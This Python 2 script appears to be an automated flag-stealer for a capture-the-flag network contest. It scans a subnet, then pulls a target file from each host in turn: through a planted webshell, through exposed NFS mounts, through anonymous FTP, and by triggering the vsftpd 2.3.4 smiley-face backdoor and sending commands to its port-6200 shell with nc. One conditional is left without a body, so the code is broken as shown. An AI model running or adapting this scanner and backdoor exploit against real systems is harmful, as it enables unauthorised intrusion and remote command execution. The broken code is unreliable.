import socket,os,threading,re,requests
from ftplib import FTP
ip=[]
alive_list=[]
sem=threading.Semaphore(10)
for c in range(2, 255 + 1):
    for d in range(240, 250 + 1):
        ip.append('10.101.' + str(c) + '.' + str(d))
def scan(ip,port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(0.01)
    r = sock.connect_ex((ip,port))
    sock.close()
    if r == 0:
        if port == 21:
        return True
def get_alive(ip):
    port_list = [21,22,23,80,445,3306,3389,8080,8888]
    for port in port_list:
        if scan(ip,port):
            alive_list.append(ip)
            return
def main(aip):
    with sem:
        #webshell get flag
        try:
            port_list=[80,8080,8888]
            for port in port_list:
                if scan(aip,port):
                    html = requests.get("http://"+aip+':'+str(port)+"/?cmd=cat /root/flagvalue.txt", timeout=0.5).text
                    flag = re.findall(r'<pre>(.*?)</pre>',html)[0]
                    if len(flag) == 32:
                        print "WebShell:" + aip, "Flag:"+flag+'\n'
                        return
        except Exception:pass
        #nfs get flag
        try:
            if scan(aip,2049):
                nfs_path = '/mnt/nfs/'+aip
                if not os.path.exists(nfs_path):os.makedirs(nfs_path)
                os.popen('mount -t nfs -o nfsvers=4.0,soft '+aip+':/ '+nfs_path).read()
                flag = os.popen('cat '+nfs_path+'/root/flagvalue.txt').read()
                if len(flag) == 32:
                    print "NSF:" + aip, "Flag:" + flag +'\n'
                    return
                os.popen('umount -fl '+nfs_path)
        except Exception:pass
        #get ftp flag
        try:
            if scan(aip,21):
                ftp_path = '/mnt/ftp/'+aip
                if not os.path.exists(ftp_path): os.makedirs(ftp_path)
                os.system('wget ftp://'+aip+'/flagvalue.txt -P '+ftp_path+' -q')
                flag = os.popen('cat '+ftp_path+'/flagvalue.txt').read()
                if len(flag) == 32:
                    print "FTP Any:" + aip, "Flag:" + flag + '\n'
                    return
                else:
                    sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                    sock.connect((aip,21))
                    sock.send("USER e:)\n")
                    sock.recv(1024)
                    sock.send("PASS \n")
                    sock.close()
                    flag = os.popen('echo "cat /root/flagvalue.txt;exit" | nc %s 6200' % aip).read()
                    if len(flag) == 32:
                        print "FTP 234:" + aip, "Flag:" + flag + '\n'
                        return
                    os.system('rm -rf ' + ftp_path)
        except Exception:pass
for i in ip:
    threading.Thread(target=get_alive,args=(i,)).start()
for aip in alive_list:
    threading.Thread(target=main,args=(aip,)).start()